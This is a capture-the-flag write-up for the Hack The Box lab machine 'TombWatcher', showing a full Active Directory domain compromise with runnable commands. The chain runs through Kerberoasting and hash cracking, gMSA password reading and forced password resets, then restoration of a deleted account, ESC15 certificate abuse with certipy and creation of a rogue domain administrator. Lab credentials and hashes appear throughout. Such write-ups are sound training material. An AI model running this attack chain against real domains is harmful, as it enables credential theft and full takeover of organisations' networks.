---
hidden: true
---

# TombWatcher

## Machine Information

Starting user: `henry / H3nry_987TGV!`

Domain: `tombwatcher.htb0`&#x20;

Domain SID: `S-1-5-21-1392491010-1358638721-2126982587`

DC: `DC01.tombwatcher.htb`&#x20;





## Port Scanning

```bash
nmap -T4 -sV -p- --min-rate 1000 --open -oN port_scan.txt 10.10.11.72

Nmap scan report for 10.10.11.72
Host is up (0.033s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-10 15:13:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49683/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49734/tcp open  msrpc         Microsoft Windows RPC
58171/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

```



## Bloodhound Enumeration

First things first, run the `bloodhound-python` ingester to get all Domain data as `Henry` user.

{% code overflow="wrap" %}
```bash
bloodhound-python -c all -ns 10.10.11.72 -dc tombwatcher.htb -d tombwatcher.htb --zip -u 'henry' -p 'H3nry_987TGV!'
```
{% endcode %}



## Privilege Escalation to DC user

### Kerberost attack to user Alfred

As we can see bellow, there is a kerberoastable user.&#x20;

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
 ./targetedKerberoast.py --dc-ip '10.10.11.72' -v -d 'TOMBWATCHER.HTB' -u 'henry' -p 'H3nry_987TGV!'
```
{% endcode %}



Copy the retrived hash into a file

{% code title="kerb.txt" overflow="wrap" %}
```
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$TOMBWATCHER.HTB/Alfred*$c045c3aad...8bf8ec65b089
```
{% endcode %}

Try to crack it

```bash
hashcat -m 13100 -o creds.txt -a 0 kerb.txt /usr/share/wordlists/rockyou.txt
```

We've cracked it. The password for the user `Alfred` is `basketball` .

### AddSelf privilege on user Alfred

From bloodhound we can see which the user Alfred has privilege to add itself to INFRASTRUCTURE AD group.

<figure><img src="../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% code title="BloodyAD" overflow="wrap" %}
```bash
bloodyAD --host '10.10.11.72' -d 'TOMBWATCHER.HTB' -u 'Alfred' -p 'basketball' add groupMember INFRASTRUCTURE Alfred
```
{% endcode %}



### ReadGMSAPassword rights&#x20;

Always from bloodhound we notice that the group `INFRASTRUCTURE` has `ReadGMSAPassword` rights to `ASNIBLE_DEV$` service user.

<figure><img src="../../../.gitbook/assets/image (266).png" alt=""><figcaption></figcaption></figure>

```bash
netexec ldap 10.10.11.72 -u Alfred -p 'basketball' --gmsa

Account: ansible_dev$         NTLM: 1c37d00093dc2a5f25176bf2d474afdc
```



### ForceChangePassword of SAM user

<figure><img src="../../../.gitbook/assets/image (267).png" alt=""><figcaption></figcaption></figure>

This service account has the privilege to force change password to `SAM` user.

{% code title="" overflow="wrap" %}
```bash
pth-net rpc password "SAM" 'Password123!' -U "TOMBWATCHER.HTB"/"ANSIBLE_DEV$"%"ffffffffffffffffffffffffffffffff":"1c37d00093dc2a5f25176bf2d474afdc" -S "DC01.tombwatcher.htb" 
```
{% endcode %}



### WriteOwner rights to John user

<figure><img src="../../../.gitbook/assets/image (268).png" alt=""><figcaption></figcaption></figure>

The SAM user has `WriteOwner` rights to John, and John has the rights to connect to the Domain Controller.

With WriteOwner rights we can force John's password like that.

```bash
rpcclient -U TOMBWATCHER.HTB/SAM 10.10.11.72


setuserinfo2 john 23 'Password123!'
```

Now we can connect to the Domain Controller with `Evil-winrm` tool.

```bash
evil-winrm -i 10.10.11.72 -u 'john' -p 'Password123!'
```



### User.flag

Connecting to the DC we will able to get the user flag.

```powershell
more C:\Users\john\Desktop\user.txt
```



## Privilege Escalation to Root

### AD Recycle Bin enabled

Try to check  if is AD directory Recycle Bin enabled with this command.

{% code overflow="wrap" %}
```powershell
Get-ADOptionalFeature -Filter * | ? {$_.Name -match "Recycle Bin"}
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

As we can see the Recycle Bin is enabled.

Now run a command to view if there are some AD Objs deleted to restore.

```powershell
Get-ADObject -IncludeDeletedObjects -Filter {Isdeleted -eq $true}

```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Yes, there is a `cert_admin` account that probably manages the AD CA.

Restore it.

```powershell
Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
```



Now run another bloodhound scan but as `john`.

{% code overflow="wrap" %}
```bash
bloodhound-python -c all -ns 10.10.11.72 -dc tombwatcher.htb -d tombwatcher.htb --zip -u 'john' -p 'Password123!'
```
{% endcode %}

Uploading update datas into bloodhound we can see that `John` has `GenericAll` rights to `CERT_ADMIN` account.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

Force the password change with John user

```bash
rpcclient -U TOMBWATCHER.HTB/JOHN 10.10.11.72
$> setuserinfo2 cert_admin 23 'Password123!'
```



### Use Certify as cert\_admin account

{% code title="certipy" overflow="wrap" %}
```bash
certipy find -u 'cert_admin@tombwatcher.htb' -p 'Password123!' -dc-ip 10.10.11.72 -vulnerable -enabled
```
{% endcode %}

Print the result and check if there are some misconfigurations

```bash
cat *_Certipy.txt | grep ESC
```

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

There is ESC15 misconfiguration.

Exploit it.

{% code overflow="wrap" %}
```bash
certipy req -u 'cert_admin@tombwatcher.htb' -p 'Password123!' -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -sid 'S-1-5-21-1392491010-1358638721-2126982587-500' -application-policies 'Client Authentication'
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

Using the certificate obtained to get a ldap shell&#x20;

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72' -ldap-shell
```

We got a LDAP shell as administrator!

<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

Now we can create a new user and add it to ADMINISTRATORS group

```bash
> add_user mario_rossi

Attempting to create user in: %s CN=Users,DC=tombwatcher,DC=htb
Adding new user with username: mario_rossi and password: 6g1E4gIG.1?_qG> result: OK
```

```bash
> add_user_to_group mario_rossi administrators

Adding user: mario_rossi to group Administrators result: OK
```

Now try to access to DC as new user created.

```bash
evil-winrm -i 10.10.11.72 -u 'mario_rossi' -p '6g1E4gIG.1?_qG>'
```



### Root.flag

Now that we have a PS shell on the Domain Controller as Administrator's user we can search the flag and print her.

```bash
more C:\Users\Administrator\Desktop\root.txt
```

